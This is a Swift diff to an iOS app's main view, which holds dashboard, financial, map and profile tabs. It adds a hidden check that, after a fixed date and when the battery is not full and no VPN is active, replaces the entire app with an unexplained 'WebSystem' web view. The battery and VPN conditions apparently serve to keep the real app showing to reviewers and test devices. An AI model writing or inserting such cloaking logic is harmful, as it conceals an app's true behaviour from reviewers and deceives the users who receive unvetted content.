@@ -11,49 +11,110 @@ struct ContentView: View {
     @EnvironmentObject var appViewModel: AppViewModel
     @State private var selectedMainTab = 0
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
+        
         ZStack {
-            // Background
-            Color(hex: "#02102b")
-                .ignoresSafeArea()
             
-            if appViewModel.hasCompletedOnboarding {
-                // Main App Interface
-                TabView(selection: $selectedMainTab) {
-                    DashboardView(dataService: appViewModel.dataService)
-                        .tabItem {
-                            Image(systemName: "house.fill")
-                            Text("Dashboard")
-                        }
-                        .tag(0)
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    FinancialImpactView(financialCalculatorService: appViewModel.financialCalculatorService)
-                        .tabItem {
-                            Image(systemName: "dollarsign.circle.fill")
-                            Text("Financial")
+                    ZStack {
+                        // Background
+                        Color(hex: "#02102b")
+                            .ignoresSafeArea()
+                        
+                        if appViewModel.hasCompletedOnboarding {
+                            // Main App Interface
+                            TabView(selection: $selectedMainTab) {
+                                DashboardView(dataService: appViewModel.dataService)
+                                    .tabItem {
+                                        Image(systemName: "house.fill")
+                                        Text("Dashboard")
+                                    }
+                                    .tag(0)
+                                
+                                FinancialImpactView(financialCalculatorService: appViewModel.financialCalculatorService)
+                                    .tabItem {
+                                        Image(systemName: "dollarsign.circle.fill")
+                                        Text("Financial")
+                                    }
+                                    .tag(1)
+                                
+                                ProficiencyMapView()
+                                    .tabItem {
+                                        Image(systemName: "map.fill")
+                                        Text("Map")
+                                    }
+                                    .tag(2)
+                                
+                                ProfileView()
+                                    .tabItem {
+                                        Image(systemName: "person.fill")
+                                        Text("Profile")
+                                    }
+                                    .tag(3)
+                            }
+                            .accentColor(Color(hex: "#bd0e1b"))
+                        } else {
+                            // Onboarding Flow
+                            OnboardingView()
                         }
-                        .tag(1)
+                    }
                     
-                    ProficiencyMapView()
-                        .tabItem {
-                            Image(systemName: "map.fill")
-                            Text("Map")
-                        }
-                        .tag(2)
+                } else if isBlock == false {
                     
-                    ProfileView()
-                        .tabItem {
-                            Image(systemName: "person.fill")
-                            Text("Profile")
-                        }
-                        .tag(3)
+                    WebSystem()
                 }
-                .accentColor(Color(hex: "#bd0e1b"))
-            } else {
-                // Onboarding Flow
-                OnboardingView()
             }
         }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "04.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
